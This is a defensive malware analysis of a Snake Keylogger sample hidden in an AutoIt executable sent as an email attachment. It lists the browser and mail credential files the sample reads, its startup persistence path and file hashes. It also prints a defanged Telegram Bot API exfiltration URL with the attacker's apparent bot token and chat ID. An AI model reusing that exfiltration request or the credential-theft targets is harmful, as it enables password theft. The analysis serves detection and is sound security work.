# Autoit Passwordstealer
Analysing of a sneaky Autoit password stealer

During one of client system checkups, we observed that sandbox (protection against 0-day malware) detected unique sample.

## What it does?
A spy trojan is a type of malware that has the capability to gather information from the infected system without consent from the user. This information is then sent to a remote attacker.

## Let's investigate:
1. It comes as an email attachment.    
2. Low detection rate on Virus Total (few hours ago, it was even lower):    
   
![Screenshot 2024-10-03 105532](https://github.com/user-attachments/assets/3bf887a9-e987-4c95-9324-24b904c2bc6c)    
4. **Various detection evasion techniques (MITRE ATT&CK):**
- Installs itself for autorun at Windows startup ([T1547.001][T1112][T1547])
- Tries to unhook or modify Windows functions - Defense Evasion::Impair Defenses::Disable or Modify Tools ([T1562.001][T1562])
-	Establishes an encrypted HTTPS connection

![image](https://github.com/user-attachments/assets/11cfae11-d0dc-4c74-9e47-755dcbdda6b0)

## Malicious behavior    
**Access to private data:**    
C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\*
C:\Users\Administrator\AppData\Roaming\Comodo\IceDragon\Profiles\*
C:\Users\Administrator\AppData\Roaming\Mozilla\Firefox\Profiles\anuqzgm9.default\logins.json
C:\Users\Administrator\AppData\Roaming\Thunderbird\Profiles\*

**Startup list modified**    
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\name.vbs

**Malware sample is being copied**    
C:\Users\Administrator\AppData\Local\directory\name.exe

**Network communications (Network IOCs)**    
- checkip.dyndns.org
- hxxp://checkip.dyndns.org/
- 188.114.97.7 - this is malicious server hiding behind Cloudflare.

![image](https://github.com/user-attachments/assets/35f411be-00d3-44a6-b70e-9a8985414114)

**Another one where your data is being uploaded to Telegram trough Telegram API:**    

hxxps://api.telegram.org/bot7844099330:AAF8QvgLCzWpfFABAfLjd1zx_8jhNhBnkCM/sendDocument?chat_id=6023628633&caption=WALKER%20/%20Passwords%20/%201.254.1.255

## What's inside "PAYMENtT SLIP.zip"    
- PAYMENtT SLIP.exe

**Malware name:** Snake Keylogger.    

**Let's dig deeper:**    
- Autoit script inside (0_script.au3):    
![image](https://github.com/user-attachments/assets/9af2cf8d-17ee-4375-9cf3-06b68de88591)    
- And more interesting components inside:    
![Screenshot 2024-10-03 185431](https://github.com/user-attachments/assets/71c26f26-331f-44f5-b826-8dbe8e94c029)


# IOCs    
**File IOCs (SHA256):**    

PAYMENtT SLIP.exe: 010de55b915041cf53041d71331242f6f6ee3774288795510cc632c970c588eb    

0_script.au3: 47890475b089b0beeaa2b00004ee3c7e9b30a672e4d48cffc1ec9ccbac137c67    

PAYMENtT SLIP.zip: 9ecedfa7d90d3320af7442a724d64ba96387b1d364344b7898ed2d05e99a2c60    
   
